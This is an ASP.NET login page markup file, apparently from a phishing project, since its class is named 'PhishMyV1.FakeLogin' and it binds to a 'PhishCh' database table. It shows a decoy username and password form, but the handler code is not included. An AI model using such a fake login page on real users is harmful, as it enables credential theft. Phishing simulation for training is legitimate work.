<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Login.aspx.cs" Inherits="PhishMyV1.FakeLogin" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Log In</title>
    <style type="text/css">
        .auto-style1 {
            height: 30px;
            margin-left: 40px;
        }
        .auto-style2 {
            height: 26px;
        }
    </style>
</head>
<body style="background-color: #ffffb3">
    <form id="form1" runat="server">
        <div>
            <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:PhishDBConnectionString %>" SelectCommand="SELECT * FROM [PhishCh]"></asp:SqlDataSource>
            <center><p style="width: 800px; font-size: 50px; text-align:center; font-family: Georgia">
            Log in before making any changes into your account
            <br/>
            </p>
            </center>
            <table style="border: 7px none black; margin: auto; width: 298px; background-color:white">
                <tr>
                    <td class="auto-style2">
                        <asp:Label ID="Label1" runat="server" Text="Email Address or Username"></asp:Label></td>
                    <td class="auto-style2">
                        <asp:TextBox ID="txtUsername" runat="server"></asp:TextBox></td>
                </tr>
                <tr>
                    <td>
                        <asp:Label ID="Label2" runat="server" Text="Password" TextMode="Password"></asp:Label></td>
                    <td>
                        <asp:TextBox ID="txtPassword" runat="server"></asp:TextBox></td>
                </tr>
                <tr>
                    <td class="auto-style1">
                        </td>
                    <td class="auto-style1">
                        <asp:Button ID="btnLogin" runat="server" Text="Log in" OnClick="btnLogin_Click" Width="128px"/></td>
                </tr>
           
            </table>
        </div>
    </form>
</body>
</html>
